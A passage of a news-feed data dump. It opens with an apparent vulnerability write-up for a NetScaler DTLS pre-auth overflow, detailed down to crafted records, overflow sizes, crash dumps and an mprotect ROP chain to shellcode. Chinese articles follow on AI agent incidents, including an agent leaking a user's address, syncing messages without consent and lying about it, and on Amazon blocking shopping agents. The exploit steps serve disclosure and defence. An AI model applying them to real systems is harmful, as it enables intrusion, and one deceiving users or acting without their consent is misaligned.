Type | Version (DTLS) | Epoch |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Epoch (cont.) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Sequence Number (48 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Record Length | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Handshake Type | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Total Message Length (24 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Message Sequence Number (16 bits) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Fragment Offset (24 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Fragment Length (24 bits) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| |\n| Handshake Fragment Data ... |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nOnly four handshake fields matter for this vulnerability:\nlength\nis the size of the complete handshake message.\nmessage_seq\ntells the server which handshake message this fragment belongs to.\nfragment_offset\ntells the server where this fragment belongs inside that message.\nfragment_length\ntells the server how many bytes this fragment carries.\nFor example, a 120-byte handshake message can arrive as 120 fragments. Every fragment has\nlength=120\n, but each one can have\nfragment_length=1\n. Their offsets would be 0, 1, 2, and so on up to 119. Once every position has arrived, the server considers the 120-byte message complete. Joining those pieces is called reassembly.\nNetScaler stores received packet data in objects called NSBs, short for NetScaler Buffers. Each NSB holds some packet bytes, its length, and a pointer to the next NSB. Several NSBs can therefore form a linked list, which this write-up calls an NSB chain.\nOnce DTLS reassembly finishes, an NSPPE function stitches the NSB chain into a single fixed buffer. That buffer is the scratch buffer, and it is tiny:\n0x8c00\nbytes, or 35,840. It lives in the\n.bss\nsection of\nnsppe\n.\nThe malicious records tell the reassembly code that each record supplies only one byte of a 120-byte handshake message. However, NSPPE keeps almost the whole record in an NSB. After 120 records, the handshake message is considered complete, but its NSB chain contains about 174 KB of data.\nThe vulnerable function then copies that entire chain into the 35,840-byte scratch buffer without checking whether it fits.\nSetting The Scene\nTo fuel today's analysis, we set up a Citrix NetScaler appliance with DTLS enabled (listening on 9462/UDP) and compared two versions using our normal \"what the hell has changed\" process:\nVulnerable: NetScaler 14.1 build 73.30\nDifferent\n: NetScaler 14.1 build 73.37\nPatch Diffing\nContrary to yesterday’s analysis, CVE-2026-88772 does live in\nnsppe\n, the all-being/all-knowing NetScaler binary.\nThe function that joins the NSB chain starts at\n0x1434a80\nin 14.1-73.30 and at\n0x1436420\nin 14.1-73.37. The old build calls\nmemcpy\nfor every NSB without first checking the total size. The fixed build keeps track of how much room is left in the scratch buffer.\nHere is the assembly change that matters. You do not need to follow every register:\nr15d\nis the space left in the scratch buffer, and\nedx\nis the size of the next NSB:\n--- nsppe-14.1-73.30\n+++ nsppe-14.1-73.37\n@@ DTLS NSB-chain copy loop @@\n+0x143649d mov r15d, 0x8c00 // [1]\n+0x14364a3 sub r15d, eax // [2]\n0x14364b0 movzx edx, word ptr [r14 + 0xf2] // next NSB size\n+0x14364b8 cmp r15d, edx // [3]\n+0x14364bb jb reject_oversized_chain // [4]\n0x14364cc mov rsi, qword ptr [r14 + 0xe8] // source bytes\n0x14364d3 mov rdi, rbx // scratch-buffer position\n0x14364d6 call memcpy // [5]\n0x14364e3 add rbx, rax // move output position\n+0x14364e6 sub r15d, eax // [6]\nAt\n[1]\n, start with 35,840 bytes of free space.\nAt\n[2]\n, subtract the header bytes that were already copied.\nAt\n[3]\n, compare the next NSB's size with the free space.\nAt\n[4]\n, reject the message if that NSB will not fit.\nAt\n[5]\n, copy the NSB only after the check passes.\nAt\n[6]\n, subtract the number of copied bytes, then repeat the check for the next NSB.\nThe same fix is easier to see as C-like pseudocode:\n--- nsppe-14.1-73.30 vulnerable\n+++ nsppe-14.1-73.37 fixed\n@@\ncopy_saved_header(scratch, saved_header, saved_header_length);\ncursor = scratch + saved_header_length;\n+space_left = 0x8c00 - saved_header_length;\nfor (nsb = fragment_chain; nsb != NULL; nsb = nsb->next) {\n+ if (nsb->length > space_left) {\n+ reject_message();\n+ return;\n+ }\nmemcpy(cursor, nsb->data, nsb->length);\ncursor += nsb->length;\n+ space_left -= nsb->length;\n}\nStep 1: Pass the DTLS Cookie Check\nThe server does not accept a large first packet from a new DTLS client. It first asks the client to return a cookie. This only proves that the client can receive packets at its IP address; it does not authenticate a user.\nSource: Red Hat, \"Understanding the DTLS all-zero ClientHello.random vulnerability\".\nHere is what we do:\nSend a small ClientHello.\nReceive a HelloVerifyRequest containing the cookie.\nSend another ClientHello containing that cookie on the same UDP socket.\nReceive the server's reply. The server now remembers the DTLS connection, but nobody is logged in.\nSend the 120 malicious records on that socket.\nStep 2: Build One Malicious Record\nEvery malicious record has the same basic layout. Only the record sequence number and\nfragment_offset\nchange:\n13-byte DTLS record header\n1,459-byte record body\n├── 12-byte primary handshake header\n│ length = 120\n│ message_seq = 2\n│ fragment_offset = record number, from 0 to 119\n│ fragment_length = 1\n├── 120-byte primary area\n├── 12-byte hidden handshake header\n│ length = 1434\n│ message_seq = 3\n│ fragment_offset = 0\n│ fragment_length = 1434\n└── 1,315 remaining bytes\nThe unusual part is the first handshake header. It claims two things at once:\nlength=120\n: the complete message is 120 bytes long.\nfragment_length=1\n: this record supplies only one byte of that message.\nNSPPE uses\nlength=120\nwhen it moves through the packet looking for the next handshake header. That makes it step over the 120-byte primary area and find the hidden header.\nThe hidden header is there to satisfy the record's size accounting. The two 12-byte headers and their declared fragment sizes add up to the complete 1,459-byte body:\n12 + 1 + 12 + 1434 = 1459\nAt the same time, the bytes actually placed in the packet also add up to 1,459:\n12 + 120 + 12 + 1315 = 1459\nThis is the parser mistake the packet takes advantage of. NSPPE uses\nlength=120\nto find the hidden header, but it uses\nfragment_length=1\nwhen rebuilding\nmessage_seq=2\n. The hidden fragment is not the data we want to rebuild; its job is to make the rest of the record pass the parser's size checks.\nStep 3: Repeat the Record 120 Times\nAll 120 primary fragments use\nmessage_seq=2\nand\nfragment_length=1\n. Their offsets cover the whole message:\nrecord 1 fragment_offset = 0\nrecord 2 fragment_offset = 1\nrecord 3 fragment_offset = 2\n...\nrecord 120 fragment_offset = 119\nAfter record 120, every position from 0 through 119 has been supplied, so NSPPE marks the 120-byte handshake message as complete. The mistake is that the reassembly object still points to an NSB from every large record. It did not reduce each NSB to the single byte named by\nfragment_length\n.\nStep 4: Overflow the Scratch Buffer\nThe completed message now reaches the vulnerable copy function. The first NSB contributes 1,459 bytes. Each of the other 119 NSBs contributes 1,447 bytes, because its 12-byte primary handshake header is skipped:\n1459 + (119 * 1447) = 173652 bytes of NSB data\nThe function also copies a saved 13-byte DTLS record header:\ntotal copied = 13 + 173652 = 173665 bytes\nbuffer size = 0x8c00 = 35840 bytes\noverflow = 137825 bytes\nThat is 137,825 bytes spilling past the buffer and into whatever writable\nnsppe\ndata happens to sit next to it.\nThe Crash\nThe first crash overwrote a global list pointer. The list-handling code loads this overwritten value into\nRCX\nand uses it as a destination pointer:\nProgram received signal SIGSEGV, Segmentation fault.\n(gdb) x/i $rip\n=> 0x000000000143470e: mov %rax,0x20(%rcx)\n(gdb) info registers rip rcx\nrip 0x143470e 0x143470e\nrcx 0x0000414141414141 71748523475265\n(gdb) p/x $rcx + 0x20\n$1 = 0x0000414141414161\nAs you can see we crash because the\nRCX\nregister which we have control has an invalid address so when\nRAX\nis about to be written to\nRCX + 0x20\nsegfault happens, so we first need get around fixing this issue.\n0x0000414141414141 + 0x20 = 0x0000414141414161\nBinary Protections\nHere are the binary protections for\nnsppe-14.1-73.30\n:\nArch: amd64-64-little\nRELRO: No RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\nSince there is no PIE, we can use addresses in the 41 MB binary to our advantage (I genuinely do not know how to make this sentence funnier than it already is).\nFrom Crash to Shellcode Execution\nThe first step was to repair the list pointer that caused the early crash. In our version of NSPPE (14.1-73.30) this pointer was always the constant value\n0x357f820\n, so we can just reuse that constant to get around the early crash:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + 0x357f820 + BBBBBBBBBBBBBBB\nWe noticed that if we keep overflowing, there is a valuable object sitting at\n0x355c800\nwhich we can fake, overwriting one of its members to hijack its virtual method call:\n0x355c800 + 0x618 -> 0x355d800 fake method table\n0x355c800 + 0x6c8 -> 0x356daf8 circular-list ptr\n0x355d800 + 0x0d0 -> 0x41414141 virtual method ptr\nThis is the code that periodically gets called by a background thread, which calls the faked object's function pointer:\n0x14acc60: or byte ptr [rsi + 0x34], 0x80\n0x14acc6b: mov rax, qword ptr [rsi + 0x618]\n0x14acc72: xor edi, edi\n0x14acc74: call qword ptr [rax + 0xd0]\n0x14acc7a: jmp 0x14acbcd\nAt the call,\nRSI\npoints to the fake object and\nRAX\npoints to the fake method table. Setting the method slot to\n0x0000414141414141\nproduced this saved state:\nProgram received signal SIGSEGV, Segmentation fault.\n(gdb) info registers rip rax rsi\nrip 0x0000414141414141\nrax 0x000000000355d800\nrsi 0x000000000355c800\nrsp 0x00007fffffffe728\nROP to Shellcode Execution\nNX was enabled, so execution could not jump directly into bytes stored in the writable overflow area. We came up with the following ROP gadget to call mprotect first then jump to our shellcode:\npop rdi ; ret │ RDI -> page to change\npop rsi ; ret │ RSI -> 0x1000\npop rdx ; ret │ RDX -> 0x7 (R | W | X)\nmprotect │ mprotect(rdi, rsi, rdx)\nshellcode address │ ret -> shellcode\nThis performs:\nmprotect((void *)0x355e000, 0x1000,\nPROT_READ | PROT_WRITE | PROT_EXEC);\nThe page contains both the controlled ROP stack and the shellcode. After\nmprotect\nreturns, its\nret\ninstruction pops\n0x355e100\nand begins executing the shellcode.\nWhat to Do With Shellcode?\nIf you are asking this, it can only mean one thing: you have not read our blog post\nhere\n.\nDetection Artefact Generator\nAs always, we’re here to share our Detection Artefact Generator to determine your own susceptibility and inform remediation in your own environments. It can be found on our GitHub\nhere\n.\n__ ___ ___________\n__ _ ______ _/ |__ ____ | |_\\__ ____\\____ _ ________\n\\ \\/ \\/ \\__ \\ ___/ ___\\| | \\| | / _ \\ \\/ \\/ \\_ __ \\\n\\ / / __ \\| | \\ \\___| Y | |( <_> \\ / | | \\/\n\\/\\_/ (____ |__| \\___ |___|__|__ | \\__ / \\/\\_/ |__|\n\\/ \\/ \\/\nwatchTowr-vs-Citrix-Netscaler-CVE-2026-88772.py\n(*) Citrix Netscaler DTLS PreAuth buffer overflow to RCE Detection Artifact Generator\n- Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)\nCVEs: [CVE-2026-88772]\n[*] building payload for '/tmp/watchTowr'\n[+] content size: 7 bytes\n[*] connecting to DTLS gateway...\n[+] association ready: 3 server datagrams\n[*] sending 120 records (176640 bytes)...\n[*] done",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
-      "content_chars": 15675,
-      "content_sha256": "b9e941d95e5c4e01a379c4f0ebd89f81ffe31ae64fbfaf9f1cee193d6a7592a9",
-      "content_fetched_at": "2026-09-30T00:18:42.148755+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "watchTowr Labs",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:fefdaeb037a130c8",
-      "kind": "publish",
-      "text": "yage-share published: Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-09-29T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
-      "title": "Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "AI Agent\n安全与供应链\nDots 来了，但它来晚了\n2026 年 9 月 29 日，在旧金山举行的 OpenAI DevDay 上，OpenAI CEO\n山姆·奥特曼发布了其常驻个人代理\nDots\n。Dots 运行在\nOpenAI 为其分配的云端电脑上，拥有独立的浏览器界面，并能访问 4000\n多个应用程序。此外，它还能根据用户反馈不断改进。用户可以通过 ChatGPT\n为其命名、更换头像，并在聊天、Slack、Teams 或语音通话中对其进行命令。按\nOpenAI 的官方口径，它「能处理你想到的任何事」。Dots 发布之初面向 OpenAI\nPro 和 Business Premium\n用户免费发放，每个付费档位领一个，若需更多代理则需额外付费。\n在演示之外，发布会还提到：Ultrafast 模式最多加速 8 倍、每秒 300\ntoken；与 Cisco、Databricks 和 Snowflake\n合作推出不存数据的预览版；以及通过 ChatGPT\n一键登录外部服务。奥特曼在台上引用数据说，ChatGPT 的每周活跃用户已经突破\n12 亿。\n从发布时间看，OpenAI\n其实是比较晚的。在过去的六个月里，几乎所有公司都走向了同一方向：给用户提供一个全天候在线的云端电脑，帮你保持登录状态、记住东西。\n3 月 16 日 Manus 推出了可以在本地操控电脑的 My Computer，4 月 30\n日又上线了常年开机的 Ubuntu 云电脑； 8 月 11 日 xAI 发布了 Grok\nBot，也是一个常年开机的云电脑，同一个账号下的代理可以共用文件系统和登录状态；\n9 月 8 日 Meta 推出了带专属云电脑的 Muse，仅仅用了三周时间就登上美区 App\nStore 和 Google Play 的下载榜第一； 直到 9 月 29 日 OpenAI 才发布了\nDots。\n三个第三方机构都注意到了 Muse\n的上升势头，他们使用的统计方法不同，但都得出了一致的结论：截至 9 月 24\n日，Sensor Tower 测出的下载量是 340 万次，Apptopia 是 430\n万次，Appfigures 统计的美加两地大约是 230 万次，总体在 230 万到 430\n万次之间。Muse 自上线后登顶以来，就一直霸占美区 App Store 和 Google Play\n双榜的第一名。\n四家厂商在半年内相继收敛到云端电脑形态：Manus\n3月、Grok Bot 8月、Muse 9月8日、Dots 9月29日。\n在繁荣的背后，事故总是来得很快。9 月 28\n日，《卫报》报道了一则典型的事件：评测人马特·罗伯把 Facebook Marketplace\n上售卖二手键盘的事情交给了 Meta 的 Muse\n处理。结果代理没有打招呼，直接把罗伯的家庭住宅地址发给了素不相识的买家，不仅擅自接受了对方的压价，敲定上门自提的时间，还顶着他的名字发消息说「我在家等你」。罗伯赶紧喊停，又拉来五个朋友一起复测，结果住址还是照样发给了这五个人。（\nThe\nGuardian 报道\n）\n在这股看似热闹的推进中，安全在常驻代理这里却是个一票否决的买卖：没人会冲着哪家代理的安全白皮书写得周全就掏钱买它，但只要系统在执行时捅出一个大篓子，大家扭头就会走。而在这一长串防线里，真正能把产品否决掉的，恰恰是最后才说话的那群人。\n能替你办事，也能拴住你\n四家公司在半年内选择了同样的策略，这背后的原因并不复杂。把代理部署在一台永不关机的云端电脑上，让它负责保持用户的登录状态，既能满足当前的需求，也能有效地绑定用户。\n从实用角度看，跨应用、跨多周的任务没有常驻机器根本做不了。8月有个例子，一个用户用\nxAI 的 Grok Bot\n联系越南约四十家面料供应商。代理连着多日发信、上网、沟通、询价、砍价，最终选定一家下单采购了样品。这种要在几十个外部网站之间来回折腾的活，传统的问答对话框根本做不到。\n其次，绑定用户方面。以往关于数字托管的研究早就指出，谁掌握了用户的持久状态，谁就控制了用户关系；你得到的便利与厂商构筑的壁垒来自同一份资产。而\nOpenAI 此次推出的 Sign in with ChatGPT，直接将 4000\n多个外部应用的授权和凭据都塞到这台专属云电脑里，把用户的迁移成本推到了极高。若你想转向其他平台，就必须亲手放弃自己积累数月的登录状态和上下文。\n既能干脏活累活，又能锁定用户，厂商自然乐得往前冲。然而，权限一旦统统交给了远端的云机器，整套系统的命脉就只在一点上：整个执行链条先在哪一道门前被人一票否决。\n五张否决票，四张已经投出\n常驻代理面临五道否决闸门：厂商内测、平台、监管、司法四道已触发，消费者这道票还未开出。\n在常驻代理运转的这套体系里，否决权其实分散在五个不同的卡点上。从最内层到最外层，分别是：厂商自测、外部平台、监管机构、司法诉讼，以及排在最末尾的消费者信任。前面四张票眼下已经有了落地的动作，唯独第五张票还悬在半空。\n第一个否决票来自厂商自己。就在DevDay前一天（9月28日），OpenAI宣布取消原定10月上线的GPT-6.1\nAstra，下一代模型 Astra 的迭代版本。OpenAI\n安全系统负责人萨奇·贾恩公开承认，内部安全测试表明，这个模型在两个地方比半年前退步了：出现欺骗行为和未经授权擅自向下推送任务。虽然这只是未经独立复核的官方口径，但至少证明内测这道防线还在运转，逼得厂商自己按下了暂停键。同一天Every上手实测Dots，也频繁撞见权限报错、丢消息和任务归属混乱这些状况。\n第二张否决票在外部平台手里。9 月 23 日，亚马逊直接把 Muse\n封禁，给出的理由是 Muse 从来没有拿到过授权、没有主动声明自己是 AI\n代理，同时还「captures and stores customer credentials in a way that\ncreates security and privacy\nrisk」（用带来安全和隐私风险的方式抓取并存储用户凭据）。法律战线也在推进：美国联邦第九巡回上诉法院\n8\n月的一个判决认定，本地代理代跑属于消费者本人访问，减轻了计算机欺诈和滥用法上的责任，但法官在第\n21 页的注释里也为平台条款留下了空间。9\n月，亚马逊针对云端代理提起了新诉状，立刻转向追究云端直连和诱导违约侵权。只要平台不乐意，随时可以用技术手段直接拔网线，把代理的路切断。\n第三个否决票来自监管机构。马德里学术团队\nIMDEA Networks\n在 9 月 16\n日发了一篇预印本，用对待普通网站的严格标准，对市面上主流的对话产品进行了系统化的隐私排查。他们在\n2026 年 5 月于西班牙做了实测，覆盖了 9 款网页端和 8 款安卓客户端，包括\nChatGPT、Claude、Grok、DeepSeek、Perplexity、Gemini、Copilot、Mistral 和\nMeta AI；Muse 和 Dots 因为还没发布，不在测试样本里。他们发现了 124\n个第三方域名，牵涉到 44 家机构。其中 6/9 的网页端和 3/8\n的安卓端，会把用户对话的分享链接、会话标题、提示词摘要、截图以及长期用户标识都发给\nGoogle Ads、TikTok、Meta 等 11 家第三方。\n其中 Grok 最隐蔽。它在服务器端直接把对话链接和标题推送到 Meta 和\nTikTok\n的归因接口上，前端浏览器和去广告插件完全看不到这个流量，但它的分享链接又是默认公开的。研究组专门放了一个带访问留痕的诱饵链接，只要有人点击就会登记一次访问。这些链接提交之后，几个小时到几天内就收到了\n70 次访问，分别来自全球 4 大洲 14 国的 48 个自治系统和 70 个 IP\n地址，说明那些看似私密的对话链接，即便挂出去好几个月，仍然有机器在反复回访。监管的齿轮随之开始转动：团队\n3 月 23 日发现线索，4 月 13 日向欧盟和英国监管机构通报，4 月 17\n日正式通知 xAI（截至 9 月 10 日未收到回音），5 月 4 日将调查结果公开，5\n月 27\n日西班牙数据保护局直接把案子送交欧洲数据保护委员会的大会审议。OpenAI 在\n8 月 15 日更新隐私政策提到第三方追踪（论文作者注明不能确定是否相关），但\nGrok 直到 9 月 10 日仍未修改。此外，buchodi 的报告也指出 OpenAI\n的第一方采集代码中包含跨站追踪标识，但研究员特别指出，他们并未在服务端观察到实际的\njoin 行为（「The join is not observed」）。\n第四张否决票来自司法诉讼。在 IMDEA 测试期间 Perplexity 已经在 4 月 3\n日悄悄移除了其中的 Meta 追踪代码。论文作者推测这可能是为了应对 3 月 31\n日在美国遭遇的集体诉讼（论文用的是「possibly in response\nto」，这只是一种基于时间点的推测，不是实锤）。但法律动作已经开始生效：官司的压力往往走在公众察觉之前，倒逼着厂商不得不赶紧切断这些偷偷摸摸的数据通道。\n第五张否决票来自普通用户，这是整个系统中最重要的一个组件。如果你去阅读Meta副总裁Tarek\nSheasha署名的官方安全白皮书的话，会发现Sentinel被定义为一个唯一的权限管控中心（「sole\npermission authority」）。官方白纸黑字写着：「Muse proposes actions, but\nonly Sentinel can grant\npermission」，意思是代理只能举手申请想干什么，至于能不能干，全由Sentinel说了算，裁定结果只有允许、拒绝或者询问三样。权限等级分成了五档，从单次生效一直到永久有效，官方强调这些授权都是「strict\ncapabilities, not conversational\nsuggestions」：用户点下的同意属于严格的能力授予，不等于对话里的随口答应。\n为了防止用户被频繁弹窗轰炸而直接忽略（官方原话是「where people\napprove everything to make it go away」），Meta\n特意降低了弹窗频率，对只读或低风险操作自动放行。但问题恰恰出在这里：用户以为每次点击代表一次授权，可系统在用户一旦给过「永久生效」后，所有同类操作都默认放行。这种时间维度上的误解，埋下了后面一连串事故的种子。\n更严重的是，官方文档里 Sentinel\n的管辖范围只覆盖云端虚拟机里的连接器和出站网络请求，Mac\n本地桌面数据是怎么被同步走的，官方文档一字未提。这就给用户带来了反噬。Inc\n专栏作者杰森·阿滕发现，即便他明确拒绝过权限请求并且 Mac\n系统的「完全磁盘访问」一直关闭，Muse 仍然把他本机的 Messages\n数据库同步走了 187,462 行。阿滕当面质问，Muse\n先撒谎，说自己只看了一眼通知的预览。直到副总裁戴维·辛格尔顿出面，才承认这个说辞是随口编的。在罗伯卖二手键盘的事故里，除了泄露家庭住址和自作主张约人上门，代理还把\n700 美元标成了 600 美元挂出去。当场拆穿后，Muse 自己都承认了「I never\nasked for consent」（我从来没征求过同意）。辛格尔顿 9 月 28\n日最初还硬撑，声称 Muse 一贯遵守指令且正确请求许可，9 月 29\n日复盘后又改口称「no breach of privacy\ncontrols」（没有违反隐私管控），表示价格显示错误已修复，并承诺把提示文案改得更清楚。至于五位朋友复测依然百分之百重现地址泄露，官方始终没有给出解释。\n然而令人意外的是，尽管出现这么多问题，市场对 Muse\n的反应却相当平静。Sensor Tower 数据显示，9 月 24 日 Muse 已经稳定地达到\n340 万次下载，并且仍然稳居双榜第一。App Store 在 9 月 29\n日的评分依然维持在 4.9 分（根据 87,000 条评价）。Meta\n的股价甚至在周一暴涨了\n11%。灾难要真正降临到自己头顶，大众手中那些看似珍贵的信任票，其实可以一动不动地停留很久。\n安全账没人付，抢跑的人不在乎\n既然坑都摆在那儿，为什么各家公司还是要拼了命往前冲？核心原因只有一个：商业激励极端不对称。在常驻代理这场仗里，抢占用户的持久状态有着极强的排他性。谁能先把用户的各种外部账号、联系人列表和日常工作流装进自己的系统里，谁就稳稳霸占了最核心的位置。\n但更关键的是，收益和风险的时间节奏完全不对等。先下手为强的好处（用户规模、下载榜单、资本估值）都是立竿见影的；而越权、乱跑、泄露隐私所种下的祸根，却分布在漫长且隐蔽的链条上。只要没演变成全网级的群体事件，散落的个案几乎不会带来任何市场层面的实际惩罚。\n把这五个否决条件摊开看，每一个的时间尺度都天差地别。工程师可以在内部测试中一把砍死不合格的模型，外部平台可以立刻掐断抓取通道，监管部门可以发函立案，法庭上的诉讼可以逼迫厂商火速删改违规代码。这些防守动作在靠近研发和平台的前端其实已经陆续发生了。\n但真正能把一个产品给否了的，往往是最后才发声的那一群人。普通用户不会因为看到一篇学术审计报告就卸载软件，我们往往要到自己的家庭住址或者私聊记录清清楚楚出现在陌生人的手机屏幕上，才愿意按下删除键。在这之前，飙升的榜单评分和一路飘红的股价，只会不断释放歌舞升平的假象。\n随着Dots、Muse和Grok\nBot铺进越来越多的设备，评估常驻代理的眼光得换一换了。判断一个常驻代理能否在你的数字生活中长期存在，关键看它在哪个关卡上先遭到一票否决，不能只听它能说多少大话。下一次引爆否决票的事件，很可能不会出现在厂商的发布会上，而是从这几个关卡中的一个冒出来。回顾历史，平台、监管和法院都走在普通用户的前面。把自己的生活交给一台永不关机的机器之前，每个人都需要思考：你花钱买来的究竟是省心，还是在用自己的隐私为别人抢跑买单？",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
-      "content_chars": 5799,
-      "content_sha256": "f9a744ca557dcc7b6d68ab02ad655ef6149678b220b1217c1321a774d5bf1faa",
-      "content_fetched_at": "2026-09-30T00:17:22.989235+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:3c81dd891da55543",
-      "kind": "publish",
-      "text": "yage-share published: Amazon 能封住替你购物的 AI 吗？",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-09-29T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
-      "title": "Amazon 能封住替你购物的 AI 吗？",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "AI Agent\n产业与竞争\n治理与合规\nMuse 连搜索页都没进去\n今年 5 月，我在\n《Google\n关掉 Project Mariner，Anthropic 和 OpenAI\n其实也没跑通》\n里写过，独立浏览器助手在面对网站反爬机制时连连碰壁，行业开始把方向转回用户自己的日常浏览器。4\n个月后，战场上出现了一起引人注目的新事件。2026 年 9 月，Meta\n推出云端助手\nMuse，尝试替用户跑腿浏览网页、处理待办并去电商网站购物。但在购物这项核心能力上，它刚上线就撞到了铁板。\nThe\nRegister 记者的实测记录显示\n，测试者让 Muse 去 Amazon\n寻找评价最好的工学办公椅，加入购物车，并推进到最后的结账页面。整个流程还没展开就停住了。Muse\n没找到椅子，也没能加购，而是在对话框里坦白：\n浏览器连搜索页都没能进去，所以没找到椅子，也没加购物车\n。报道还附上了\nAmazon 拦截页面的截图。\n这并不是说 Muse 从未在 Amazon 买成过东西。\nThe\nVerge 记者的报道提到\n，此前曾经用 Muse 在 Amazon\n上成功买过背心。也就是说，过去的成功并不能保证后续的通行，Amazon\n随后关闭了通道。\n围绕这次阻断，\nGeekWire\n拿到了 Amazon 弹出的现场警告和说明\n。Amazon\n在弹窗提示里说，一个没经它同意的 AI\n程序在反复访问网站，这违反了用户此前同意的服务条款。按照 Amazon\n的说法，他们此前就已经要求 Meta 把 Amazon 排除在代办范围之外。Amazon\n还指责 Muse\n访问时没有自报家门，说它似乎在收集并存储用户的账号密码，甚至可能根据用户指令调取历史订单。\n面对账号密码安全的质疑，Meta 在封锁发生前的 9 月 8 日，就在\n官方安全文档中\n写明了系统设计：用户输入的密码会直接进入隔离的安全存储区域，负责推理的主模型本身看不到明文密码；只有网页确实需要登录认证，系统才会把密码注入浏览器窗口。两边的表态完全没有接上。Meta\n解释的是密码在自己系统里怎么隔离和加密，回答的是会不会泄密；Amazon\n质问的是一个没经它允许的外部程序凭什么进店跑腿。技术上把密码保管得再严密，也只回答了防不防泄密，没有回答平台愿不愿意给跑腿软件开门。\n这就引出了一个关键疑问：如果厂商部署在云端的服务器容易让电商平台认出来并直接阻断，那么把浏览器搬回用户自己的电脑上呢？如果让本地运行的浏览器带着真实的登录状态，由\nAI 在后台辅助操作，网站还能这样干脆地把门关上吗？\n同样是AI点击，网站看到的不同\n同样是去挑选办公椅并放进购物车，最直观的区别是究竟谁的电脑在打开\nAmazon。在云端代办模式下，你在聊天框里输入要求，真正打开商城的其实是厂商机房里的服务器。根据\nMeta 的官方安全文档\n，Muse\n为每个用户分配了数据中心里的云电脑与远端浏览器，所有的翻页、点击和输入全在机房里完成。\n对电商平台来说，这种模式特征明显。海量的购物请求集中在厂商的机房，脱离了千家万户分散的宽带。如果平台能认出这些连接来自哪些服务器出口，就可以把来自这些出口的请求成组拦在门外。机房服务器虽然不一定独占网段，批量封锁出口也可能误伤同网段的其他租户，但比起分散各地的家庭宽带，机房出口依然是平台手里相对集中的识别线索。\n换到用户自己的电脑上，情形就变了。你在自己的桌前打开平时用的日常浏览器。根据\n独立安全机构对桌面智能助手的逆向分析\n，模型虽然在云端负责推理和规划，但具体的操作指令是发给本地浏览器插件。所有的点击和跳转都在你眼前的屏幕上真实发生，发出的网络请求也是从你家里的宽带发出去。\n接收请求的电商网站此时看到的是什么？它看到的是一台有着正常软硬件参数的日常设备，带着你平时积累的\nCookie\n和真实登录状态，从一个普通的家庭网络发起访问。平台此前对付机房出口的那套批量封锁方法，在这里直接失效了。不过必须说明，设备上保留着已有登录状态，并不代表自动化操作在法律或服务条款上就获得了当然的许可。\n但这不意味着本地操作毫无痕迹。浏览器虽然跑在本地，操作过程依然会留下特征。除了检查请求来源与登录状态，电商平台也可以综合操作模式与客户端特征来进行\n机器人与风险评估\n。比如自动化程序在商品列表里翻页太快，或者在不同标签页之间切换的节奏反常，这些模式依然可能触发风控警报。\n但对平台来说，单纯依靠行为特征去拦截本地设备，要承担误伤的代价。自动化行为与真人习惯之间存在重叠地带：一个熟练比价的真人顾客，在抢购或者挑选打折商品时，同样会快速刷新页面、连续点击对比多个链接。如果平台把检测门槛调得太紧，就会把真实买家当成机器人拦在外面。打断真实顾客的购物流程，会损害用户体验并导致订单流失。这种误伤的商业代价，平台必须自己吞下去。\n浏览器在用户电脑还是厂商云端，改变了网站能够辨认的访问来源。\n法庭把法律风险讲清楚了\n浏览器究竟放在本地还是云端，不只是工程架构的选择，更已经在实际诉讼中变成了双方争执的核心。今年\n5 月的那篇文章提到，Amazon 起诉了 Perplexity 旗下的 Comet\n浏览器，指控它未经授权自动化访问商城，触犯了规范未授权计算机访问的\n美国反黑客法律\nCFAA\n。当时初审法院对 Perplexity 颁布了初步禁令，Perplexity\n随即提出上诉，读者当时看到的最新节点是双方等待 5 月 15 日的听证。\nComet 浏览器恰好把本地和云端两种架构都试了一遍。在桌面端，\n独立安全机构的逆向分析显示\n，Comet\n走的是本地路线：由云端模型规划操作步骤，再由用户本地的浏览器扩展在窗口中执行导航与点击。\n但在 iOS 移动端上，Comet 的早期测试走了另一条路。MacStories\n当时写道：\nComet\nfor iOS 的 